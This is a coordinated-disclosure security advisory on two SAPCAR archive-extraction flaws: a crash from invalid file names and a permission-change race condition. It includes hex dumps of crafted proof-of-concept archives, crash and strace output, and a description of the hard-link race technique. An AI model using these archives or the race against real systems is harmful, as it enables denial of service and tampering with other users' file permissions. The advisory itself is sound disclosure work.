@@ -1,0 +1,142 @@
+1. Advisory Information
+
+Title: SAP CAR Multiple Vulnerabilities
+Advisory ID: CORE-2016-0006
+Advisory URL: http://www.coresecurity.com/advisories/sap-car-multiple-vulnerabilities
+Date published: 2016-08-09
+Date of last update: 2016-08-09
+Vendors contacted: SAP
+Release mode: Coordinated release
+
+2. Vulnerability Information
+
+Class: Unchecked Return Value [CWE-252], TOCTOU Race Condition [CWE-367]
+Impact: Denial of service, Security bypass
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2016-5845, CVE-2016-5847
+
+3. Vulnerability Description
+
+SAP [1] distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to local denial of service conditions or privilege escalation.
+
+4. Vulnerable Packages
+
+SAPCAR archive tool
+Other products and versions might be affected, but they were not tested.
+
+5. Vendor Information, Solutions and Workarounds
+
+SAP published the following Security Notes:
+
+2312905
+2327384
+
+6. Credits
+
+This vulnerability was discovered and researched by Martin Gallo from Core Security Consulting Services. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.
+
+7. Technical Description / Proof of Concept Code
+
+SAP distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to denial of service conditions or escalation of privileges.
+
+The code that handles the extraction of archive files is prone to privilege escalation and denial of service vulnerabilities.
+
+7.1. Denial of service via invalid file names
+
+[CVE-2016-5845] Denial of service vulnerability due the SAPCAR program not checking the return value of file operations when extracting files. This might result in the program crashing when trying to extract files from an specially crafted archive file that contains invalid file names for the target platform. Of special interest are applications or solutions that makes use of SAPCAR in an automated way.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+ 
+        $ xxd SAPCAR_crash.SAR 
+        0000000: 4341 5220 322e 3031 4452 0081 0000 0f00  CAR 2.01DR......
+        0000010: 0000 0000 0000 0000 0000 d4f8 e555 0000  .............U..
+        0000020: 0000 0000 0000 0000 1000 696e 7075 742d  ..........input-
+        0000030: 6469 722f 696e 7090 7400 4544 1a00 0000  dir/inp.t.ED....
+        0000040: 0f00 0000 121f 9d02 7bc1 23b9 a90a 25a9  ........{.#...%.
+        0000050: 1525 0a69 9939 a95c 0000 857f b95a       .%.i.9.\.....Z
+        
+        $ ./SAPCAR -dvf SAPCAR_crash.SAR
+        SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)
+        d input-dir/inp#t
+        SAPCAR: checksum error in input-dir/inp#t (error 12). No such file or director
+        
+        $ ./SAPCAR -xvf SAPCAR_crash.SAR
+        SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)
+        x input-dir/inp#t
+        Segmentation fault
+ 
+7.2. Race condition on permission change
+
+[CVE-2016-5847] Race condition vulnerability due to the way the SAPCAR program change the permissions of extracted files. If a malicious local user has access to a directory where a user is extracting files using SAPCAR, the attacker might use this vulnerability to change the permissions of arbitrary files belonging to the user.
+
+The SAPCAR program writes the file being extracted and after closing it, the program changes the permissions to the ones set on the archive file. There's a time gap between the creating of the file and the change of the permissions. During this time frame, a malicious local user can replace the extracted file with a hard link to a file belonging to another user, resulting in the SAPCAR program changing the permissions on the hard-linked file to be the same as that of the compressed file.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+ 
+      $ xxd SAPCAR_race_condition.SAR
+      0000000: 4341 5220 322e 3031 5247 b481 0000 2b00  CAR 2.01RG....+.
+      0000010: 0000 0000 0000 0000 0000 d023 5e56 0000  ...........#^V..
+      0000020: 0000 0000 0000 0000 1000 7465 7374 5f73  ..........test_s
+      0000030: 7472 696e 672e 7478 7400 4544 3500 0000  tring.txt.ED5...
+      0000040: 2b00 0000 121f 9d02 7b21 19a9 0a85 a599  +.......{!......
+      0000050: c9d9 0a49 45f9 e579 0a69 f915 0a59 a5b9  ...IE..y.i...Y..
+      0000060: 05c5 0af9 65a9 450a 2540 e99c c4aa 4a85  ....e.E.%@....J.
+      0000070: 94fc 7400 0008 08c6 b9                   ..t......
+      
+      $ ./SAPCAR -tvf SAPCAR_race_condition.SAR 
+      SAPCAR: processing archive SAPCAR_race_condition.SAR (version 2.01)
+      -rw-rw-r--          43    01 Dec 2015 19:48 test_string.txt
+      
+      $ strace ./SAPCAR -xvf SAPCAR_race_condition.SAR 
+      execve("./SAPCAR", ["./SAPCAR", "-xvf", "SAPCAR_race_condition.SAR"], [/* 76 vars */]) = 0
+      [..]
+      open("test_string.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4
+      mmap(NULL, 323584, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c4704000
+      fstat(4, {st_mode=S_IFREG|0664, st_size=0, ...}) = 0
+      mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c475c000
+      write(4, "The quick brown fox jumps over t"..., 43) = 43
+      close(4)                                = 0
+      munmap(0x7f98c475c000, 4096)            = 0
+      utime("test_string.txt", [2015/12/01-19:48:48, 2015/12/01-19:48:48]) = 0
+      chmod("test_string.txt", 0664)          = 0
+      [..]
+       
+8. Report Timeline
+
+2016-04-21: Core Security sent an initial notification to SAP.
+2016-04-22: SAP confirmed the reception of the email and requested the draft version of the advisory.
+2016-04-22: Core Security sent SAP a draft version of the advisory and informed them we would adjust our publication schedule according with the release of a solution to the issues.
+2016-04-25: SAP confirmed the reported vulnerabilities and assigned the following security incident tickets IDs: 1670264798, 1670264799 and 1670264800.
+2016-05-10: Core Security asked SAP if they had a tentative date for publishing the security fixes.
+2016-05-20: SAP informed Core Security they have a tentative release date on July 12th, 2016 (July Patch day).
+2016-05-23: Core Security thanked SAP for the tentative date and informed them we would publish our security advisory accordingly upon their confirmation.
+2016-06-27: Core Security requested SAP the tentative security notes numbers and links in order to add them to our security advisory.
+2016-07-05: SAP informed Core Security they due to some issues found during their testing phase of the patches they were not in a position to ship the patches as part of their July patch day. They said they would be able to ship the patches with August patch day.
+2016-07-06: Core Security requested SAP the specific day in August they planed to release the patches.
+2016-07-20: Core Security requested again SAP the specific day in August they planed to release the patches.
+2016-07-21: SAP informed Core Security they would publish their security notes on the 9th of August.
+2016-08-10: Advisory CORE-2016-0006 published.
+9. References
+
+[1] http://go.sap.com/. 
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+11. About Core Security
+
+Courion and Core Security have rebranded the combined company, changing its name to Core Security, to reflect the company’s strong commitment to providing enterprises with market-leading, threat-aware, identity, access and vulnerability management solutions that enable actionable intelligence and context needed to manage security risks across the enterprise. Core Security’s analytics-driven approach to security enables customers to manage access and identify vulnerabilities, in order to minimize risks and maintain continuous compliance. Solutions include Multi-Factor Authentication, Provisioning, Identity Governance and Administration (IGA), Identity and Access Intelligence (IAI), and Vulnerability Management (VM). The combination of these solutions provides context and shared intelligence through analytics, giving customers a more comprehensive view of their security posture so they can make more informed, prioritized, and better security remediation decisions.
+
+Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com.
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2016 Core Security and (c) 2016 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+13. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
